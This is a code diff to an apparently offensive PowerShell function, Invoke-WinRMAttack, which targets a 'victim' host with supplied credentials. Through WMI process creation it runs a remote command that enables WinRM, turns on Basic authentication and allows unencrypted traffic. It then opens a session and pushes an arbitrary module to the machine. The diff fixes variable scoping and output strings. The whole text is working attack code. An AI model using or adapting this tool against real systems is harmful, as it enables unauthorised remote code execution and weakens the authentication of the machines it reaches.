@@ -96,23 +96,20 @@ function Invoke-WinRMAttack
 		[ValidateNotNullorEmpty()]
 		[Alias('victim')]
 		[string]$remote,
-		[Parameter(Mandatory = $false,
-				   HelpMessage = 'Path to Module to send to remote system')]
+		[Parameter(Mandatory = $false)]
 		[Alias('module')]
 		[string]$modulepath,
 		[Parameter(Mandatory = $true,
 				   HelpMessage = 'Switch to allow Remote System credentials')]
 		[Alias('credentials')]
 		[switch]$creds,
-		[Parameter(Mandatory = $false,
-				   HelpMessage = 'Switch to connect to remote session after module push')]
+		[Parameter(Mandatory = $false)]
 		[Alias('bind')]
 		[switch]$autoconnect
 		
 	)
+    $Script:remotesession = ''
 	
-	$modulepath = $null
-	$global:remotesession = $null
 	if ($creds)
 	{
 		$creden = Get-Credential
@@ -120,13 +117,13 @@ function Invoke-WinRMAttack
 	function New-Session
 	{
 		Write-Output -InputObject 'Creating a PSSession to the Remote System'
-		$remotesession = New-PSSession -ComputerName $remote -Credential $creden -Name $remote
+		$Script:remotesession = New-PSSession -ComputerName $remote -Credential $creden -Name $remote
 	}
 	
 	function Push-Module
 	{
 		Write-Output -InputObject 'Pushing the Module to the Remote System'
-		Invoke-Command -Session $remotesession -FilePath $modulepath
+		Invoke-Command -Session $Script:remotesession -FilePath $modulepath
 	}
 	
 	function Test-PsRemoting
@@ -136,14 +133,14 @@ function Invoke-WinRMAttack
 		}
 		if ($result -ne 1)
 		{
-			Write-Output -InputObject 'PSRemoting is not enabled on $remote, I am going to try to enable it.'
+			Write-Output -InputObject 'PSRemoting is not enabled on' $remote ', I am going to try to enable it.'
 			
 			$command = 'cmd /c powershell.exe -c Set-WSManQuickConfig -Force;Set-Item WSMan:\localhost\Service\Auth\Basic -Value $True;Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $True;Register-PSSessionConfiguration -Name Microsoft.PowerShell -Force'
 			Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $remote -Credential $creden -ArgumentList $command
 		}
 	}
 	
-	#Check if PSRemoting is already enabled
+	#Check if PSRemoting is already Enabled
 	Test-PsRemoting
 	
 	function Connect-Remote
@@ -182,4 +179,3 @@ function Invoke-WinRMAttack
 		Write-Output -InputObject 'To connect to the session later, use Invoke-WinRMAttack -autoconnect'
 	}
 }
-
